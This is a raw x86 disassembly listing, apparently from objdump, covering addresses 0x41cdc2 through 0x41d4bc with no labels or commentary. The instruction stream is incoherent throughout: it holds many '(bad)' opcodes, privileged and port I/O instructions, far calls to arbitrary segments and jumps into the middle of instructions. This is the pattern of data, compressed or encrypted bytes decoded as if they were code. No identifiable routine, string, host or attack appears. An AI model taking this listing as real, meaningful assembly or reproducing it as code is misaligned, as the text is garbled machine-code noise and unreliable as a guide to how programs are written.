  41cdc2:	push   0xa189fb77
  41cdc7:	adc    bh,BYTE PTR [edi-0x8]
  41cdca:	pop    ebp
  41cdcb:	pop    es
  41cdcc:	test   BYTE PTR [esp+ecx*2+0x653d0000],dl
  41cdd3:	je     0x41cdd0
  41cdd5:	inc    DWORD PTR [eax]
  41cdd7:	add    BYTE PTR [eax],al
  41cdd9:	add    BYTE PTR [eax],al
  41cddb:	dec    ebx
  41cddc:	sub    al,0x86
  41cdde:	add    BYTE PTR [eax+eax*1-0x7f],bl
  41cde2:	rol    BYTE PTR [eax+0x81e39ad],0x77
  41cde9:	sti    
  41cdea:	jne    0x41ce6b
  41cdec:	add    DWORD PTR [ecx-0x30],0xffffffa5
  41cdf0:	sub    eax,0xc0091
  41cdf5:	xchg   DWORD PTR [ebp-0x14],eax
  41cdf8:	rcr    ah,0x2
  41cdfb:	ins    BYTE PTR es:[edi],dx
  41cdfc:	jne    0x41ce6f
  41cdfe:	fmul   QWORD PTR [ebx+0x21ff0bdd]
  41ce04:	mov    ah,0x12
  41ce06:	inc    eax
  41ce07:	or     al,0x7b
  41ce09:	inc    ecx
  41ce0a:	and    bl,ch
  41ce0c:	sbb    eax,0x1ddb0145
  41ce11:	dec    ebp
  41ce12:	add    cl,BYTE PTR [ebp-0x69f4fba0]
  41ce18:	add    bh,BYTE PTR [ebp-0x795fde77]
  41ce1e:	add    BYTE PTR [edi+0x6b],bl
  41ce21:	or     BYTE PTR [eax+eiz*8],bh
  41ce24:	push   es
  41ce25:	test   BYTE PTR [eax-0x75],bh
  41ce28:	jbe    0x41ce25
  41ce2a:	mov    esp,ecx
  41ce2c:	iret   
  41ce2d:	xchg   DWORD PTR [ebp+0x68],ecx
  41ce30:	js     0x41cdb4
  41ce32:	xchg   esp,eax
  41ce33:	jne    0x41cdce
  41ce35:	add    BYTE PTR [eax],al
  41ce37:	call   0x933f7f62
  41ce3c:	add    al,0xf8
  41ce3e:	mov    DWORD PTR [eax],0x0
  41ce44:	jp     0x41ce6b
  41ce46:	push   eax
  41ce47:	in     eax,0x82
  41ce49:	mov    ah,0xb0
  41ce4b:	adc    bh,BYTE PTR [ecx+0x5c003fd8]
  41ce51:	icebp  
  41ce52:	test   al,0xfc
  41ce54:	push   0x30
  41ce56:	aas    
  41ce57:	fdivr  st(0),st
  41ce59:	sbb    eax,0xbc5afdb4
  41ce5e:	in     al,dx
  41ce5f:	(bad)  
  41ce60:	leave  
  41ce61:	fwait
  41ce62:	mov    cl,0x12
  41ce64:	or     DWORD PTR [eax+0x44],ebx
  41ce67:	add    dh,ch
  41ce69:	fst    QWORD PTR [edi]
  41ce6b:	out    0xe9,eax
  41ce6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce6e:	add    BYTE PTR [eax],al
  41ce70:	(bad)  
  41ce71:	fst    st(3)
  41ce73:	mov    BYTE PTR [eax+0x9857a6d],bh
  41ce79:	cdq    
  41ce7a:	add    BYTE PTR [eax],al
  41ce7c:	call   0x133f82a6
  41ce81:	test   ah,ch
  41ce83:	mov    DWORD PTR [ecx-0x3eed4e5d],0x46004457
  41ce8d:	pop    ecx
  41ce8e:	inc    ebx
  41ce8f:	out    0x7e,eax
  41ce91:	cmp    al,0xb1
  41ce93:	cld    
  41ce94:	(bad)  
  41ce95:	gs in  al,0x88
  41ce98:	dec    eax
  41ce99:	lods   eax,DWORD PTR ds:[esi]
  41ce9a:	inc    eax
  41ce9b:	push   eax
  41ce9c:	fcmovbe st,st(5)
  41ce9e:	loopne 0x41ce9c
  41cea0:	dec    eax
  41cea1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cea2:	mov    cl,0x72
  41cea4:	fst    QWORD PTR [ecx+0x48]
  41cea7:	fiadd  WORD PTR [eax]
  41cea9:	add    BYTE PTR [eax],al
  41ceab:	add    BYTE PTR [eax],al
  41cead:	ret    0x7cf3
  41ceb0:	inc    edx
  41ceb1:	and    cl,BYTE PTR gs:[edx-0x18fd8a81]
  41ceb8:	add    edi,esp
  41ceba:	inc    esp
  41cebb:	out    dx,eax
  41cebc:	jl     0x41cefe
  41cebe:	ss pusha 
  41cec0:	dec    edx
  41cec1:	and    eax,0x377f1c97
  41cec6:	stos   BYTE PTR es:[edi],al
  41cec7:	mov    edi,0x6bfb6148
  41cecc:	xlat   BYTE PTR ds:[ebx]
  41cecd:	cwde   
  41cece:	stos   BYTE PTR es:[edi],al
  41cecf:	cmc    
  41ced0:	mov    dl,0x7
  41ced2:	or     ah,BYTE PTR [edx+0x59]
  41ced5:	imul   ebp,DWORD PTR [edx-0x3f024ba5],0x6f5abe71
  41cedf:	mov    al,0xb2
  41cee1:	pop    ecx
  41cee2:	and    BYTE PTR [esi-0x199606fe],0x3
  41cee9:	jne    0x41cef0
  41ceeb:	sbb    al,0xb8
  41ceed:	inc    ecx
  41ceee:	inc    eax
  41ceef:	(bad)  [edx+0x440dec7]
  41cef5:	xor    BYTE PTR [eax],dh
  41cef7:	add    edi,DWORD PTR [edi+0x41]
  41cefa:	stos   BYTE PTR es:[edi],al
  41cefb:	adc    ecx,DWORD PTR [esp+ebp*8]
  41cefe:	mov    ebp,0x12a7b33c
  41cf03:	mov    ?,WORD PTR [eax]
  41cf05:	sub    DWORD PTR [ecx-0x68ed0405],0x8001b2a0
  41cf0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf10:	aaa    
  41cf11:	add    BYTE PTR [eax],al
  41cf13:	add    BYTE PTR [eax],al
  41cf15:	add    bh,al
  41cf17:	fwait
  41cf18:	add    DWORD PTR [edi],0x50700275
  41cf1e:	jmp    0x9c597a9e
  41cf23:	mov    edx,0x2fd841d3
  41cf28:	out    dx,eax
  41cf29:	jle    0x41cf52
  41cf2b:	scas   al,BYTE PTR es:[edi]
  41cf2c:	inc    ebp
  41cf2d:	cmp    ch,al
  41cf2f:	jge    0x41cf55
  41cf31:	jle    0x41cee0
  41cf33:	call   0x64fc:0xa6a8c9ff
  41cf3a:	mov    dh,0x35
  41cf3c:	adc    dl,ch
  41cf3e:	inc    ebp
  41cf3f:	scas   al,BYTE PTR es:[edi]
  41cf40:	cld    
  41cf41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf42:	mov    bh,BYTE PTR [ebx+0x42]
  41cf45:	std    
  41cf46:	mov    eax,DWORD PTR [eax+edi*8-0x73]
  41cf4a:	ret    0x1c9a
  41cf4d:	jb     0x41cf83
  41cf4f:	xor    DWORD PTR es:[eax],0x4a
  41cf53:	or     bh,BYTE PTR [ecx]
  41cf55:	xchg   edi,eax
  41cf56:	pop    edx
  41cf57:	xor    al,0x11
  41cf59:	mov    dl,0xc5
  41cf5b:	cli    
  41cf5c:	jne    0x41cf55
  41cf5e:	popa   
  41cf5f:	imul   edi,DWORD PTR [edi],0x3946af70
  41cf65:	mov    eax,ds:0xc66f7774
  41cf6a:	add    al,0xa6
  41cf6c:	cmp    BYTE PTR [eax*1+0xcf581f6],ah
  41cf73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf74:	cld    
  41cf75:	bound  esi,QWORD PTR [edx+0x603fde]
  41cf7b:	add    BYTE PTR [eax],al
  41cf7d:	add    BYTE PTR [eax],al
  41cf7f:	mov    edx,0x1d1cfcde
  41cf84:	jp     0x41cf5a
  41cf86:	adc    edi,DWORD PTR [ecx-0x59]
  41cf89:	jb     0x41cf80
  41cf8b:	cdq    
  41cf8c:	mov    edx,0x508114fc
  41cf91:	std    
  41cf92:	cld    
  41cf93:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41cf95:	jb     0x41cf84
  41cf97:	lds    esi,FWORD PTR [ebx]
  41cf99:	or     BYTE PTR [ecx+0x6efccc4f],al
  41cf9f:	cli    
  41cfa0:	push   0xfe9f6c0c
  41cfa5:	(bad)  
  41cfa6:	call   0x13361b6c
  41cfab:	sub    ah,BYTE PTR [esi-0x5511c490]
  41cfb1:	loop   0x41cfb3
  41cfb3:	xor    esi,DWORD PTR [ebx-0x79]
  41cfb6:	dec    esi
  41cfb7:	add    BYTE PTR [eax+0x63480fc5],al
  41cfbd:	loope  0x41cfbe
  41cfbf:	arpl   WORD PTR [edi+0x7ea36c5a],dx
  41cfc5:	loop   0x41cfac
  41cfc7:	xor    DWORD PTR [ebx+0x37],0x5d
  41cfcb:	xchg   esp,eax
  41cfcc:	add    DWORD PTR [esi-0x48c8623],eax
  41cfd2:	xor    ebx,DWORD PTR [esi+edi*1-0x7b]
  41cfd6:	inc    esi
  41cfd7:	loopne 0x41cf6e
  41cfd9:	(bad)  
  41cfda:	jmp    0x3d2a60
  41cfdf:	xlat   BYTE PTR ds:[ebx]
  41cfe0:	aas    
  41cfe1:	clc    
  41cfe2:	cmp    DWORD PTR [eax],eax
  41cfe4:	add    BYTE PTR [eax],al
  41cfe6:	add    BYTE PTR [eax],al
  41cfe8:	cdq    
  41cfe9:	or     cl,BYTE PTR [ebx]
  41cfeb:	lea    ebx,[eax]
  41cfed:	popa   
  41cfee:	sti    
  41cfef:	inc    DWORD PTR [edi-0x20f093ac]
  41cff5:	addr16 loop 0x41cff7
  41cff8:	xor    eax,DWORD PTR [ebx]
  41cffa:	mov    dh,0x3
  41cffc:	(bad)  
  41cffd:	imul   ebp,DWORD PTR [edi],0xffffffd2
  41d000:	iret   
  41d001:	add    eax,DWORD PTR fs:[edx+0xf]
  41d005:	pop    esi
  41d006:	xchg   DWORD PTR [ebp+0x8],ecx
  41d009:	(bad)
  41d00c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d00d:	inc    DWORD PTR [edi]
  41d00f:	inc    ebx
  41d010:	mov    bl,dl
  41d012:	or     eax,DWORD PTR [eax+eiz*4-0xc0004a0]
  41d019:	inc    eax
  41d01a:	adc    al,0xff
  41d01c:	or     DWORD PTR [eax-0xf7cff9a],esp
  41d022:	sbb    ecx,DWORD PTR [ebx+0x1871730b]
  41d028:	addr16 push dx
  41d02b:	dec    ecx
  41d02d:	adc    edi,ebx
  41d02f:	jne    0x41d0a6
  41d031:	popf   
  41d032:	scas   eax,DWORD PTR es:[edi]
  41d033:	jb     0x41d0b2
  41d035:	inc    ecx
  41d036:	rcl    esi,cl
  41d038:	retf   0x8640
  41d03b:	mov    edi,0xce998049
  41d040:	jbe    0x41cfdb
  41d042:	add    BYTE PTR [edi-0x38142ab0],al
  41d048:	sub    BYTE PTR [ecx-0x15],ch
  41d04b:	pop    ebp
  41d04c:	add    BYTE PTR [eax],al
  41d04e:	add    BYTE PTR [eax],al
  41d050:	add    BYTE PTR [ecx],dl
  41d052:	mov    eax,ds
  41d054:	or     al,0xe3
  41d056:	pushf  
  41d057:	jnp    0x41d020
  41d059:	inc    esi
  41d05a:	jmp    0x41cfdf
  41d05c:	fidiv  WORD PTR [edx+0x5b]
  41d05f:	shl    ecx,cl
  41d061:	out    dx,al
  41d062:	push   esi
  41d063:	mov    ah,0xbe
  41d065:	lea    ebx,[edx+edi*2-0x2ee282fd]
  41d06c:	jae    0x41d00b
  41d06e:	fsubr  QWORD PTR [edx+eax*2+0x14473489]
  41d075:	sahf   
  41d076:	(bad)  
  41d077:	stos   DWORD PTR es:[edi],eax
  41d078:	jnp    0x41d0a2
  41d07a:	les    ecx,FWORD PTR [ecx]
  41d07c:	mov    DWORD PTR [ebx-0x364078c3],esi
  41d082:	int3   
  41d083:	jmp    0xfe293de2
  41d088:	xor    BYTE PTR [edx+ebx*8],bh
  41d08b:	jp     0x41d0da
  41d08d:	leave  
  41d08e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d08f:	ret    
  41d090:	or     al,0xf2
  41d092:	out    dx,eax
  41d093:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d094:	cld    
  41d095:	sbb    dl,ah
  41d097:	dec    edi
  41d098:	cld    
  41d099:	sbb    BYTE PTR [ebx],0x9
  41d09c:	jecxz  0x41d0a8
  41d09e:	cmp    BYTE PTR [eax+0x42],0x59
  41d0a2:	fnstcw WORD PTR [edx+0x42]
  41d0a5:	push   ecx
  41d0a6:	xor    BYTE PTR [edi],dh
  41d0a8:	and    al,0xfe
  41d0aa:	(bad)  
  41d0ab:	sbb    DWORD PTR [eax],eax
  41d0ad:	jmp    0x5dba:0xec0fdc01
  41d0b4:	cmp    DWORD PTR [eax],eax
  41d0b6:	add    BYTE PTR [eax],al
  41d0b8:	add    BYTE PTR [eax],al
  41d0ba:	jge    0x41d10c
  41d0bc:	push   esi
  41d0bd:	cmp    DWORD PTR [ebp-0x59],esp
  41d0c0:	sar    edi,cl
  41d0c2:	leave  
  41d0c3:	sub    al,0xef
  41d0c5:	fwait
  41d0c6:	das    
  41d0c7:	leave  
  41d0c8:	cmp    eax,0xe5c1f7af
  41d0cd:	mov    BYTE PTR [edi],bh
  41d0cf:	add    esp,edi
  41d0d1:	add    edi,DWORD PTR [ebx+ebp*8]
  41d0d4:	ret    
  41d0d5:	scas   eax,DWORD PTR es:[edi]
  41d0d6:	and    eax,0x96a30fce
  41d0db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d0dc:	adc    eax,0x6426387b
  41d0e1:	les    edi,FWORD PTR [ecx+0x7e]
  41d0e4:	push   ds
  41d0e5:	test   al,0x81
  41d0e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d0e8:	rcl    DWORD PTR [eax+0x6d],0xf7
  41d0ec:	ins    BYTE PTR es:[edi],dx
  41d0ed:	mov    edi,0x9ceda656
  41d0f2:	mov    al,fs:0x3cedaee5
  41d0f8:	pop    ebx
  41d0f9:	mov    DWORD PTR [edx],ebx
  41d0fb:	imul   BYTE PTR [edx+0x6e]
  41d0fe:	push   esi
  41d0ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d100:	int    0xea
  41d102:	scas   eax,DWORD PTR es:[edi]
  41d103:	cli    
  41d104:	cmc    
  41d105:	test   DWORD PTR [eax],ecx
  41d107:	lahf   
  41d108:	mov    ebp,0x134cf3ae
  41d10d:	jmp    0x41d143
  41d10f:	pushf  
  41d110:	vpmadcsswd xmm6,xmm2,XMMWORD PTR [ecx+0x48],xmm5
  41d117:	inc    edx
  41d118:	jo     0x41d15a
  41d11a:	cmp    DWORD PTR [ebx+0x2b],0xe8
  41d121:	add    BYTE PTR [eax],al
  41d123:	ret    0xbd99
  41d126:	jp     0x41d0df
  41d128:	stos   BYTE PTR es:[edi],al
  41d129:	mov    edi,0x6bf56948
  41d12e:	xchg   edx,eax
  41d12f:	push   ss
  41d130:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d131:	push   DWORD PTR [ebp-0x21]
  41d134:	inc    edi
  41d135:	ins    BYTE PTR es:[edi],dx
  41d136:	fdivrp st(7),st
  41d138:	mov    ah,dl
  41d13a:	adc    si,di
  41d13d:	mov    ch,0xea
  41d13f:	pop    edi
  41d140:	aaa    
  41d141:	xor    dh,ah
  41d143:	dec    eax
  41d144:	add    DWORD PTR [eax],ecx
  41d146:	stos   BYTE PTR es:[edi],al
  41d147:	fld    DWORD PTR [eax-0xc]
  41d14a:	imul   ch
  41d14c:	das    
  41d14d:	in     al,0x3e
  41d14f:	or     esp,DWORD PTR [edi+0x30e3dd42]
  41d155:	and    al,0xc3
  41d157:	jbe    0x41d100
  41d159:	jb     0x41d160
  41d15b:	push   ds
  41d15c:	into   
  41d15d:	cld    
  41d15e:	xchg   esp,eax
  41d15f:	outs   dx,BYTE PTR ds:[esi]
  41d160:	jnp    0x41d12a
  41d162:	mov    edi,0xe1030e3
  41d167:	dec    ebp
  41d168:	idiv   ah
  41d16a:	jl     0x41d1ea
  41d16c:	popf   
  41d16d:	stos   DWORD PTR es:[edi],eax
  41d16e:	and    ebx,ecx
  41d170:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d171:	sub    BYTE PTR [ecx],0xaa
  41d174:	jo     0x41d15c
  41d176:	inc    edx
  41d177:	je     0x41d17b
  41d179:	add    BYTE PTR [edx-0x46],dh
  41d17c:	fidivr WORD PTR [edi]
  41d17e:	jo     0x41d132
  41d180:	fimul  WORD PTR [edi-0x3e]
  41d183:	xor    DWORD PTR [edx+0x42],edi
  41d186:	rol    DWORD PTR [eax],1
  41d188:	add    BYTE PTR [eax],al
  41d18a:	add    BYTE PTR [eax],al
  41d18c:	pop    esi
  41d18d:	inc    eax
  41d18e:	adc    al,0xf6
  41d190:	ret    
  41d191:	out    dx,eax
  41d192:	jecxz  0x41d152
  41d194:	or     dl,ch
  41d196:	pop    ebp
  41d197:	inc    ebp
  41d198:	xor    BYTE PTR [edx-0x5a273bc3],al
  41d19e:	or     al,0x5f
  41d1a0:	je     0x41d1e5
  41d1a2:	aaa    
  41d1a3:	and    al,0xdd
  41d1a5:	cmc    
  41d1a6:	or     cl,0xda
  41d1a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d1aa:	cld    
  41d1ab:	mov    ?,WORD PTR [edx+0x100fd0e]
  41d1b1:	popf   
  41d1b2:	data16 add BYTE PTR [ebx-0x13],bh
  41d1b6:	sbb    ecx,DWORD PTR [ebx+0x18715713]
  41d1bc:	push   edi
  41d1bd:	imul   edx,DWORD PTR [edx-0x1],0xffffffc1
  41d1c1:	adc    bl,bh
  41d1c3:	jne    0x41d18d
  41d1c5:	push   ebp
  41d1c6:	jno    0x41d1d0
  41d1c8:	xor    al,0x4c
  41d1ca:	fdivr  st,st(7)
  41d1cc:	cmp    edi,DWORD PTR [ebp-0x44]
  41d1cf:	je     0x41d1c6
  41d1d1:	mov    BYTE PTR [ecx+0x2],dl
  41d1d4:	int3   
  41d1d5:	add    BYTE PTR [edi-0x7ac17fbb],al
  41d1db:	inc    ebp
  41d1dc:	jo     0x41d22c
  41d1de:	out    0x2f,eax
  41d1e0:	daa    
  41d1e1:	cmp    eax,0xcd139f8
  41d1e6:	or     ecx,DWORD PTR [ebp-0x49c84]
  41d1ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d1ed:	ss ins BYTE PTR es:[edi],dx
  41d1ef:	sldt   WORD PTR [eax]
  41d1f2:	add    BYTE PTR [eax],al
  41d1f4:	add    BYTE PTR [edi],cl
  41d1f6:	xchg   al,ah
  41d1f8:	(bad)  
  41d1f9:	jnp    0x41d1a0
  41d1fb:	mov    dl,0x3
  41d1fd:	xlat   BYTE PTR ds:[ebx]
  41d1fe:	in     al,0x2f
  41d200:	cpuid  
  41d202:	cli    
  41d203:	pop    es
  41d204:	inc    ebx
  41d205:	xchg   ebp,eax
  41d206:	cmp    esi,esp
  41d208:	(bad)  
  41d20a:	ret    0xffdf
  41d20d:	sub    edx,DWORD PTR [edi+0x41]
  41d210:	adc    al,0x3b
  41d212:	in     eax,dx
  41d213:	and    ebp,DWORD PTR [edx+0x4c]
  41d216:	push   edi
  41d217:	jno    0x41d235
  41d219:	(bad)  
  41d21a:	into   
  41d21b:	sti    
  41d21c:	jne    0x41d262
  41d21e:	sub    ecx,eax
  41d220:	push   esi
  41d221:	fucomi st,st(4)
  41d223:	ud0    eax,DWORD PTR [ecx+0x2475fb02]
  41d22a:	mov    ch,dh
  41d22c:	xlat   BYTE PTR ds:[ebx]
  41d22d:	jne    0x41d1bb
  41d22f:	stos   DWORD PTR es:[edi],eax
  41d230:	xor    BYTE PTR ds:0xfde6720e,0x9a
  41d237:	add    BYTE PTR [eax],al
  41d239:	out    dx,al
  41d23a:	fsubrp st(7),st
  41d23c:	aas    
  41d23d:	cld    
  41d23e:	(bad)  
  41d23f:	out    0x4f,eax
  41d241:	faddp  st(1),st
  41d243:	ja     0x41d287
  41d245:	fucom  st(2)
  41d247:	inc    esp
  41d248:	adc    al,0x6a
  41d24a:	push   ss
  41d24b:	and    al,0xd2
  41d24e:	dec    esp
  41d24f:	call   0x80062bb1
  41d254:	mov    cl,bl
  41d256:	cmp    al,0xac
  41d258:	or     al,0x0
  41d25a:	add    BYTE PTR [eax],al
  41d25c:	add    BYTE PTR [eax],al
  41d25e:	add    ebx,DWORD PTR [ecx-0x1ac7c8c1]
  41d264:	sti    
  41d265:	sbb    DWORD PTR [eax],0x38
  41d268:	lods   al,BYTE PTR ds:[esi]
  41d269:	cld    
  41d26a:	mov    ds:0x20fd1456,al
  41d26f:	mov    ebp,0x86920016
  41d274:	or     al,0x89
  41d276:	mov    ds:0xee1835f4,al
  41d27b:	lock push edx
  41d27d:	std    
  41d27e:	add    cl,cl
  41d280:	stos   DWORD PTR es:[edi],eax
  41d281:	jb     0x41d204
  41d283:	lods   al,BYTE PTR ds:[esi]
  41d284:	xor    cl,BYTE PTR [eax]
  41d286:	pop    ebp
  41d287:	cmp    ah,dl
  41d289:	cld    
  41d28a:	bound  edx,QWORD PTR [esi]
  41d28c:	les    esi,FWORD PTR [ebx+0x1c]
  41d28f:	shl    BYTE PTR [ebp-0x2],cl
  41d292:	push   edx
  41d293:	cdq    
  41d294:	sbb    dh,dl
  41d296:	pop    esp
  41d297:	das    
  41d298:	add    eax,DWORD PTR [eax]
  41d29a:	jne    0x41d2cc
  41d29c:	aas    
  41d29d:	cld    
  41d29e:	in     al,dx
  41d29f:	fisttp QWORD PTR [edi]
  41d2a1:	mov    DWORD PTR [eax-0x4f78bc0b],edi
  41d2a7:	std    
  41d2a8:	push   ebx
  41d2a9:	out    0x95,eax
  41d2ab:	add    ch,al
  41d2ad:	add    esi,DWORD PTR [ebp+0x77]
  41d2b0:	and    ebp,DWORD PTR [ebx+ecx*2-0x504c3]
  41d2b7:	add    al,0x8a
  41d2b9:	stos   DWORD PTR es:[edi],eax
  41d2ba:	add    DWORD PTR [edi+0x34],esi
  41d2bd:	sbb    BYTE PTR [ecx+ecx*8],bh
  41d2c0:	in     eax,dx
  41d2c1:	xchg   BYTE PTR [eax],al
  41d2c3:	add    BYTE PTR [eax],al
  41d2c5:	add    BYTE PTR [eax],al
  41d2c7:	xchg   ebp,eax
  41d2c8:	sahf   
  41d2c9:	jne    0x41d276
  41d2cb:	cmc    
  41d2cc:	and    al,0x73
  41d2ce:	clc    
  41d2cf:	addr16 aas 
  41d2d1:	jb     0x41d315
  41d2d3:	jge    0x41d352
  41d2d5:	xor    BYTE PTR es:[eax+0x18],ch
  41d2d9:	out    0x53,eax
  41d2db:	dec    BYTE PTR [ebx-0x15]
  41d2de:	jle    0x41d295
  41d2e0:	cdq    
  41d2e1:	(bad)  
  41d2e2:	fidivr DWORD PTR [ebx-0x7e3b9c5e]
  41d2e8:	jge    0x41d320
  41d2ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d2eb:	test   eax,0xede141a2
  41d2f0:	cmp    eax,DWORD PTR [ebx]
  41d2f2:	fbstp  TBYTE PTR [edx+0x71333fe6]
  41d2f8:	js     0x41d2db
  41d2fa:	in     eax,dx
  41d2fb:	cmp    dh,dl
  41d2fd:	xchg   ebx,eax
  41d2fe:	adc    ah,dh
  41d300:	test   eax,0xccf6fae7
  41d305:	or     BYTE PTR [ebx+0x4a98d71],ch
  41d30b:	scas   eax,DWORD PTR es:[edi]
  41d30c:	dec    eax
  41d30d:	mov    esp,0xc8cbf6fa
  41d312:	stos   BYTE PTR es:[edi],al
  41d313:	pop    ecx
  41d314:	mov    gs,WORD PTR [ebx]
  41d316:	mov    al,0x81
  41d318:	pop    eax
  41d319:	jmp    0x29dedea4
  41d31e:	xchg   DWORD PTR [ebx+0x12],ecx
  41d321:	test   BYTE PTR [edx-0x55425e3b],0x31
  41d328:	out    0xff,eax
  41d32a:	arpl   WORD PTR [eax],ax
  41d32c:	add    BYTE PTR [eax],al
  41d32e:	add    BYTE PTR [eax],al
  41d330:	or     edx,DWORD PTR [edi+0x3e]
  41d333:	jmp    0xf64b6d33
  41d338:	call   0x860f:0x76e8ffb6
  41d33f:	dec    ecx
  41d340:	rcr    BYTE PTR [esi+0xdce6afc],1
  41d346:	jbe    0x41d321
  41d348:	repz cdq 
  41d34a:	or     dh,ch
  41d34c:	sbb    ebp,0xffffff82
  41d34f:	jmp    0x644ed5ca
  41d354:	arpl   WORD PTR [ebx+0x61e366fc],sp
  41d35a:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41d35c:	xchg   esi,eax
  41d35d:	jae    0xfce0e3ce
  41d363:	inc    eax
  41d364:	sub    ah,BYTE PTR [ecx+0x3fcbe9fc]
  41d36a:	ins    BYTE PTR es:[edi],dx
  41d36b:	out    dx,al
  41d36c:	sti    
  41d36d:	(bad)  
  41d36e:	(bad)  
  41d36f:	call   0xe37a55ea
  41d374:	lahf   
  41d375:	test   BYTE PTR [ecx+0x410276e9],bl
  41d37b:	adc    BYTE PTR [edx],al
  41d37d:	mov    ds:0x99f3e9fc,al
  41d382:	push   es
  41d383:	fiadd  WORD PTR [edx]
  41d385:	cmp    esp,edx
  41d387:	push   es
  41d388:	iret   
  41d389:	xor    bh,0xc9
  41d38c:	outs   dx,DWORD PTR ds:[esi]
  41d38d:	test   DWORD PTR [esi+0xb],ecx
  41d390:	pop    ds
  41d391:	sahf   
  41d392:	cmp    cl,BYTE PTR [ecx+0x0]
  41d395:	add    BYTE PTR [eax],al
  41d397:	add    BYTE PTR [eax],al
  41d399:	jbe    0x41d39d
  41d39b:	add    dl,dl
  41d39d:	mov    al,BYTE PTR [ebx+0x18a2f0f7]
  41d3a3:	adc    ecx,0xc6f1551
  41d3a9:	fldenv [ecx-0x65b3ff04]
  41d3af:	xor    DWORD PTR ds:0xebfb6b3e,0xaf487b8
  41d3b9:	pop    esi
  41d3ba:	dec    ebx
  41d3bb:	jg     0x41d3b5
  41d3bd:	and    DWORD PTR [edx+0x6afe2582],ebx
  41d3c3:	sti    
  41d3c4:	cmp    eax,0x699
  41d3c9:	neg    esp
  41d3cb:	jle    0x41d3c5
  41d3cd:	push   es
  41d3ce:	call   0x83fb:0x6afe157e
  41d3d5:	fs cdq 
  41d3d7:	jb     0x41d41a
  41d3d9:	adc    DWORD PTR [eax],esp
  41d3db:	std    
  41d3dc:	dec    esp
  41d3de:	jge    0x41d3aa
  41d3e0:	mov    esp,DWORD PTR [edx]
  41d3e2:	mov    cl,0xf2
  41d3e4:	add    al,0xd4
  41d3e6:	mov    al,ds:0xdc57c5e7
  41d3eb:	xor    esi,esi
  41d3ed:	enter  0x9c,0xeb
  41d3f1:	jle    0x41d412
  41d3f3:	dec    ebx
  41d3f4:	xor    al,0x6a
  41d3f6:	add    cl,BYTE PTR [eax]
  41d3f8:	add    DWORD PTR [edi],esi
  41d3fa:	pop    ss
  41d3fb:	mov    BYTE PTR [esi+0x0],cl
  41d3fe:	add    BYTE PTR [eax],al
  41d400:	add    BYTE PTR [eax],al
  41d402:	mov    eax,0x9d080052
  41d407:	jge    0x41d415
  41d409:	mov    edx,edx
  41d40b:	mov    al,0xf2
  41d40d:	add    al,0x94
  41d40f:	hlt    
  41d410:	out    0xa1,al
  41d412:	pop    es
  41d413:	fdiv   QWORD PTR [ebx]
  41d415:	neg    BYTE PTR [eax-0x64]
  41d418:	or     al,0xf
  41d41a:	fcomp  DWORD PTR [ecx-0x23]
  41d41d:	call   DWORD PTR [ebx+0x6b]
  41d420:	inc    ecx
  41d421:	adc    al,0x53
  41d423:	icebp  
  41d424:	and    ebp,DWORD PTR [edx+0x5c]
  41d427:	imul   esi,DWORD PTR [ecx+0x1c],0x75
  41d42b:	and    al,0xd0
  41d42d:	cld    
  41d42e:	enter  0x7b91,0xc8
  41d432:	mov    ds:0x32102dc8,eax
  41d437:	xlat   BYTE PTR ds:[ebx]
  41d438:	idiv   esp
  41d43a:	mov    al,ds:0x4b0298a1
  41d43f:	jno    0x41d3e8
  41d441:	xor    BYTE PTR ds:0x137a7c99,0x81
  41d448:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d449:	call   0x57ecd7c4
  41d44e:	mov    ds:0x37c74aef,al
  41d453:	retf   0x9000
  41d456:	jae    0x41d491
  41d458:	inc    edx
  41d459:	add    BYTE PTR [ecx+0x3f],cl
  41d45c:	inc    edx
  41d45d:	add    BYTE PTR [edi+esi*1+0x42],dl
  41d461:	add    BYTE PTR [ebx+0x1f],cl
  41d464:	inc    edx
  41d465:	add    BYTE PTR [eax],al
  41d467:	add    BYTE PTR [eax],al
  41d469:	add    BYTE PTR [eax],al
  41d46b:	adc    eax,0xea004219
  41d470:	adc    DWORD PTR [edx+0x0],eax
  41d473:	or     DWORD PTR [edx],edx
  41d475:	inc    edx
  41d476:	add    BYTE PTR [edx-0x66ffbddf],ch
  41d47c:	and    DWORD PTR [edx+0x0],eax
  41d47f:	mov    ds:0x72004231,eax
  41d484:	xor    al,BYTE PTR [edx+0x0]
  41d487:	jp     0x41d40a
  41d489:	inc    ecx
  41d48a:	add    BYTE PTR [ecx+eax*4],bl
  41d48d:	inc    ecx
  41d48e:	add    BYTE PTR [eax+0x12],dl
  41d491:	inc    edx
  41d492:	add    ah,ah
  41d494:	adc    al,BYTE PTR [edx+0x0]
  41d497:	outs   dx,DWORD PTR ds:[esi]
  41d498:	and    eax,DWORD PTR [edx+0x0]
  41d49b:	mul    BYTE PTR [edx]
  41d49d:	inc    edx
  41d49e:	add    BYTE PTR ds:0xa0004233,bh
  41d4a4:	cmp    BYTE PTR [edx+0x0],al
  41d4a7:	mov    al,BYTE PTR [edx]
  41d4a9:	jle    0x41d4f0
  41d4ab:	jne    0x41d476
  41d4ad:	jbe    0x41d4f4
  41d4af:	jne    0x41d46e
  41d4b1:	jnp    0x41d4f8
  41d4b3:	jne    0x41d4c8
  41d4b5:	jne    0x41d4fc
  41d4b7:	jne    0x41d492
  41d4b9:	arpl   WORD PTR [ebp+0x75],ax
  41d4bc:	cmp    al,0x5c
